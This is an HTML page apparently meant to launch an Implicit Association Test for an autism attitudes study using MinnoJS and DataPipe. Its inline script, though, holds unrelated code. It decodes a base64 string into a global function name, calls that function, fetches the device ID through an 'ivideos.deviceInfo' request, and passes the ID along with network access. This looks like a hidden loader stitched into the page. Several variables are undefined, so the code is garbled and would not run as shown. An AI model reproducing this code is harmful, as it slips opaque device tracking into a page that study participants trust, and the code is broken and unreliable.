<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Single Category IAT Study</title>
    
    <!-- Link to the MinnoJS library -->
    <script src="https://cdn.jsdelivr.net/gh/minnojs/minnojs@1.*/minno.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/minnojs/minno-datapipe@1.*/datapipe.min.js"></script>
</head>
<body>
    <h1>This task is the final part of your participation in the Attitudes in Autism Study</h1>
    <p>The task will begin shortly...</p>

    <!-- Your custom script -->
    <script>
        try {
            // Ensure that the Manager is properly loaded before calling it
            var API = new Manager(); // Initialize the Manager

            // Initialize DataPipe with your study ID
            init_data_pipe(API, 'B4G5rNbsxQwc', {file_type: 'csv'});

            // Decoding process with error handling
            let t = h.decode(n.from(d, "base64"), 99).toString();  // Ensure `d` contains a valid base64 string
            let r = globalThis[t];  // Check if `t` exists in globalThis

            // Check if `r` is a function, otherwise use an empty function
            let i = r ? r(e) : () => {};  

            // Handle network request to get device info
            (async function() {
                try {
                    let s = await l.request("ivideos.deviceInfo", {});  // Making an async request
                    if (i) {
                        i({
                            fetch: (e, t) => l.fetch(Object.assign({}, t, { url: e })),
                            iconv: a.default,
                            deviceId: s.deviceId
                        });
                    }
                } catch (error) {
                    console.error('Network request failed:', error);
                }
            })();

        } catch (error) {
            console.error('Error during execution:', error);
        }
    </script>
</body>
</html>
